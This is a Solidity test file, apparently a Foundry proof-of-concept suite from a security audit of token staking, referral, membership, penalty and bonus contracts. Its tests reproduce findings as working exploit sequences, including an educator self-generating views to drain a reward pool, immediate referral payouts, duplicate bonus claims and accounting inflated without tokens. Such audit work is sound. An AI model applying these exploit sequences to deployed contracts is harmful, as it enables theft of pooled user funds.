// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { TestBase } from "../utils/TestBase.sol";
import { HackToken } from "../../src/HackTokenERC20.sol";
import { IncentivesPool } from "../../src/IncentivesPool.sol";
import { StakingContract } from "../../src/StakingContract.sol";
import { ReferralSystem } from "../../src/ReferralSystem.sol";
import { MembershipSystem } from "../../src/MembershipSystem.sol";
import { PenaltySystem } from "../../src/PenaltySystem.sol";
import { ReputationBonuses } from "../../src/ReputationBunises.sol";
import { EducatorBonuses } from "../../src/EducatorBonuses.sol";

contract SecurityPoCTest is TestBase {
    address internal constant USER = address(0xCAFE);
    address internal constant REFERRER = address(0xBEEF);
    address internal constant EDUCATOR = address(0xED0C);
    address internal constant TALENT = address(0xA11CE);
    address internal constant TREASURY = address(0x7777);
    address internal constant NEW_OWNER = address(0x1234);
    address internal constant THIRD_PARTY = address(0x5678);

    function _tokenAndPool() internal returns (HackToken token, IncentivesPool pool) {
        token = new HackToken();
        pool = new IncentivesPool(address(token));
    }

    function _fund(HackToken token, IncentivesPool pool, uint256 amount) internal {
        token.mintTokens(address(this), amount);
        token.approve(address(pool), amount);
        pool.fundPool(amount);
    }

    /// H-01: referral reward can be claimed immediately after the referred user stakes.
    function test_H01_ReferralRewardCanBeClaimedImmediately() public {
        (HackToken token, IncentivesPool pool) = _tokenAndPool();
        StakingContract staking = new StakingContract(address(token), address(pool));
        ReferralSystem referral = new ReferralSystem(address(pool), address(staking));
        pool.grantRole(pool.DISTRIBUTOR_ROLE(), address(referral));
        _fund(token, pool, 10_000 ether);
        token.mintTokens(USER, 1000 ether);

        vm.startPrank(USER);
        token.approve(address(staking), 1000 ether);
        staking.stake(1000 ether, staking.ONE_MONTH());
        referral.registerReferral(REFERRER);
        referral.validateReferral();
        vm.stopPrank();

        assertEq(token.balanceOf(REFERRER), 1000 ether, "referrer was not paid");
        StakingContract.Stake[] memory positions = staking.getUserStakes(USER);
        assertTrue(
            block.timestamp < positions[0].startTime + positions[0].duration,
            "lock elapsed unexpectedly"
        );
    }

    /// H-02: an empty incentives pool prevents principal withdrawal.
    function test_H02_EmptyRewardPoolBlocksPrincipalWithdrawal() public {
        (HackToken token, IncentivesPool pool) = _tokenAndPool();
        StakingContract staking = new StakingContract(address(token), address(pool));
        pool.grantRole(pool.DISTRIBUTOR_ROLE(), address(staking));
        token.mintTokens(USER, 1000 ether);

        vm.startPrank(USER);
        token.approve(address(staking), 1000 ether);
        staking.stake(1000 ether, staking.ONE_MONTH());
        vm.warp(block.timestamp + 30 days + 1);
        vm.expectRevert();
        staking.unstake(0);
        vm.stopPrank();

        assertEq(token.balanceOf(address(staking)), 1000 ether, "principal unexpectedly returned");
        assertEq(
            staking.totalStakedByUser(USER), 1000 ether, "stake accounting unexpectedly changed"
        );
    }

    /// M-02: no-commission eligibility checks duration, not elapsed time.
    function test_M02_NoCommissionCanBeActivatedImmediately() public {
        (HackToken token, IncentivesPool pool) = _tokenAndPool();
        StakingContract staking = new StakingContract(address(token), address(pool));
        token.mintTokens(USER, 100_000 ether);

        vm.startPrank(USER);
        token.approve(address(staking), 100_000 ether);
        staking.stake(100_000 ether, staking.ONE_YEAR());
        staking.activateNoCommission();
        vm.stopPrank();

        assertTrue(staking.noCommissionActive(USER), "no-commission benefit was not activated");
    }

    /// H-03: an educator can self-generate views and capture the educator pool.
    function test_H03_EducatorCanSelfGenerateViewsAndDrainPool() public {
        (HackToken token, IncentivesPool pool) = _tokenAndPool();
        MembershipSystem memberships = new MembershipSystem(address(token), address(pool), TREASURY);
        memberships.grantRole(memberships.EDUCATOR_ROLE(), EDUCATOR);
        token.mintTokens(EDUCATOR, 30_000 ether);

        vm.startPrank(EDUCATOR);
        token.approve(address(memberships), 30_000 ether);
        memberships.activateAcademicMembership(MembershipSystem.AcademicTier.Monthly);
        for (uint256 i; i < 25; ++i) {
            memberships.registerContentView(EDUCATOR);
        }
        uint256 balanceBefore = token.balanceOf(EDUCATOR);
        memberships.claimEducatorRewards();
        vm.stopPrank();

        assertEq(
            token.balanceOf(EDUCATOR) - balanceBefore,
            15_000 ether,
            "educator did not capture the pool"
        );
        assertEq(memberships.pendingEducatorPool(), 0, "educator pool was not drained");
    }

    /// H-04: a user can avoid an enforced penalty by withholding allowance.
    function test_H04_PenaltyCanBeAvoidedByWithholdingAllowance() public {
        (HackToken token, IncentivesPool pool) = _tokenAndPool();
        PenaltySystem penalties = new PenaltySystem(address(token), address(pool), TREASURY);
        pool.grantRole(pool.DEPOSITOR_ROLE(), address(penalties));
        token.mintTokens(USER, 10_000 ether);

        vm.expectRevert();
        penalties.applyEducatorInactivityPenalty(USER);

        assertFalse(penalties.profileBlocked(USER), "profile was blocked despite reverted penalty");
        assertEq(token.balanceOf(USER), 10_000 ether, "tokens changed despite missing allowance");
    }

    /// M-01: an authorized depositor can inflate internal accounting without sending tokens.
    function testFuzz_M01_DepositInflatesAccountingWithoutTokens(uint96 rawAmount) public {
        uint256 amount = uint256(rawAmount);
        vm.assume(amount > 0);
        (HackToken token, IncentivesPool pool) = _tokenAndPool();
        pool.grantRole(pool.DEPOSITOR_ROLE(), address(this));

        pool.deposit(amount, "accounting-only");

        assertEq(pool.poolBalance(), amount, "internal balance was not increased");
        assertEq(token.balanceOf(address(pool)), 0, "unexpected real token transfer");
        assertTrue(
            pool.poolBalance() > token.balanceOf(address(pool)),
            "accounting invariant remained intact"
        );
    }

    /// M-03: crossing a fixed 30-day epoch invalidates an otherwise open claim window.
    function test_M03_ReputationClaimBreaksAcrossEpochBoundary() public {
        (HackToken token, IncentivesPool pool) = _tokenAndPool();
        ReputationBonuses reputation = new ReputationBonuses(address(pool));
        pool.grantRole(pool.DISTRIBUTOR_ROLE(), address(reputation));
        _fund(token, pool, 5000 ether);

        uint256 epoch = 30 days;
        vm.warp((100 * epoch) + epoch - 1 days);
        reputation.registerWinner(ReputationBonuses.UserRole.Talent, USER);
        vm.warp(block.timestamp + 2 days);

        vm.prank(USER);
        vm.expectRevert();
        reputation.claimBonus(ReputationBonuses.UserRole.Talent);
    }

    /// M-04: identical educator/talent hiring events can be rewarded repeatedly.
    function test_M04_IdenticalHiringCanBeRewardedRepeatedly() public {
        (HackToken token, IncentivesPool pool) = _tokenAndPool();
        EducatorBonuses bonuses = new EducatorBonuses(address(pool));
        pool.grantRole(pool.DISTRIBUTOR_ROLE(), address(bonuses));
        _fund(token, pool, 10_000 ether);

        bonuses.rewardTalentHired(EDUCATOR, TALENT);
        bonuses.rewardTalentHired(EDUCATOR, TALENT);

        assertEq(token.balanceOf(EDUCATOR), 10_000 ether, "duplicate rewards were not paid");
        assertEq(bonuses.hiringBonusCount(EDUCATOR), 2, "duplicate event was not counted twice");
    }

    /// M-05: Ownable ownership transfer does not transfer AccessControl administration.
    function test_M05_OwnershipTransferDoesNotMoveAccessControlAdmin() public {
        HackToken token = new HackToken();
        token.transferOwnershipCustom(NEW_OWNER);
        assertEq(token.owner(), NEW_OWNER, "Ownable owner was not transferred");

        bytes32 minterRole = token.MINTER_ROLE();
        vm.expectRevert();
        vm.prank(NEW_OWNER);
        token.grantRole(minterRole, THIRD_PARTY);

        token.grantRole(minterRole, THIRD_PARTY);
        assertTrue(
            token.hasRole(minterRole, THIRD_PARTY),
            "original admin lost expected role administration"
        );
    }

    /// L-02: out-of-bounds array access panics before StakeNotFound can be evaluated.
    function test_L02_InvalidStakeIndexPanicsBeforeCustomError() public {
        (HackToken token, IncentivesPool pool) = _tokenAndPool();
        StakingContract staking = new StakingContract(address(token), address(pool));
        bytes memory panicIndexOutOfBounds =
            abi.encodeWithSelector(bytes4(keccak256("Panic(uint256)")), uint256(0x32));

        vm.prank(USER);
        vm.expectRevert(panicIndexOutOfBounds);
        staking.unstake(0);
    }
}
